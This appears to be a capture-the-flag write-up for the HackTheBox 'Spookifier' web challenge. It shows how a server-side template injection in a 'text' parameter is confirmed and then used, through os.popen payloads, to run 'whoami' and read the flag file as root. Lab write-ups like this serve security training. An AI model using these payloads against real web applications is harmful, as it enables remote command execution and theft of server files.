### Spookifier-HackTheBox🏴󠁧󠁢󠁥󠁮󠁧󠁿

#### 1. First we active the machine and we download the file

<img width="970" height="189" alt="image" src="https://github.com/user-attachments/assets/7fb72317-31f9-478b-91bb-c1664d29028f" />


#### 2. Then we go into the website.

<img width="966" height="683" alt="image" src="https://github.com/user-attachments/assets/29889078-09fd-47fc-9526-c515080ca882" />


#### 3. Now we see that we have to do some inyection, first we goes to the directories of the challenge and we look something stranger.
```bash
 cd web_spookifier/
cd challenge/
cd application/
cd blueprints/
 python3 routes.py
cat routes.py 
```

<img width="967" height="526" alt="image" src="https://github.com/user-attachments/assets/639f985d-2bf7-40b3-8b95-d2b6df0d6d37" />

 *There is only one parameter that the user controls: request.args.get('text').*


#### 4. We're going to prove the inyection SSTI.
```bash
${42-20}
```

<img width="938" height="817" alt="image" src="https://github.com/user-attachments/assets/acfcaad7-e14a-4a8b-b89c-77d564ea5d02" />


#### 5. We discover that the vulnerability is true and we try to discover whoami
```bash
${self.module.cache.util.os.popen('whoami').read()}
```

<img width="953" height="849" alt="image" src="https://github.com/user-attachments/assets/18eacaff-00e0-4657-86be-f4ce29d508cf" />


#### 6. Now we know that we're root, we search the flag.txt
```bash
${local.context.__init__.__globals__['sys'].modules['os'].popen('cat /flag*').read()}
```

<img width="992" height="964" alt="image" src="https://github.com/user-attachments/assets/529cc469-7301-4d2a-ae06-b007984c200c" />


<img width="635" height="538" alt="image" src="https://github.com/user-attachments/assets/22358fbc-ad62-406a-84c1-66e00f233b87" />

